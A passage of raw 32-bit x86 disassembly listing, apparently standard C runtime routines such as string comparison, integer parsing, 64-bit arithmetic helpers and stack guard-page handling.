  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
